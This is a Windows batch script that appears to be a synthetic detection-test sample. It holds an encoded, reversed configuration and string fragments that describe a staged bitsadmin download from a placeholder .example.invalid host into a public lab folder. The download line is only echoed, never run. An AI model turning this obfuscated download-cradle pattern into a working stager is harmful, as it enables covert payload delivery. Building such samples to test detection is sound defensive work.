@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|reverse
rem HUNTRESS-MATERIAL:dGFkLmMxYThkNWU3MzktZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuOTU3ZjgwNjkvZGlsYXZuaS5lbHBtYXhlLmMxYThkNWU3MzkvLzpzcHR0aD1scnV8YzFhOGQ1ZTczOS1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58ZWxnbmlzPWhwYXJnfDE9dG51b2NfZWdhdHN8ZXhlLm5pbWRhc3RpYj1yZXRwYWRhfGVsaWZfZXRpcncsZXRvbWVyX2VyaXVxY2E9c3BldHN8MT12
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set fragment0=v=1^|steps=acquire_remote,write_file^|adapter=bitsadmin.exe^|stag
set fragment1=e_count=1^|graph=single^|next_language=none^|campaign_id=campaign
set fragment2=-937e5d8a1c^|url=https://937e5d8a1c.example.invalid/9608f759.da
set fragment3=t^|file_path=C:\Users\Public\HuntressLab\stage-937e5d8a1c.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=c806aed5"
ver >nul
if errorlevel 1 exit /b 1
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe acquire https://937e5d8a1c.example.invalid/9608f759.dat to C:\Users\Public\HuntressLab\stage-937e5d8a1c.dat
exit /b 0
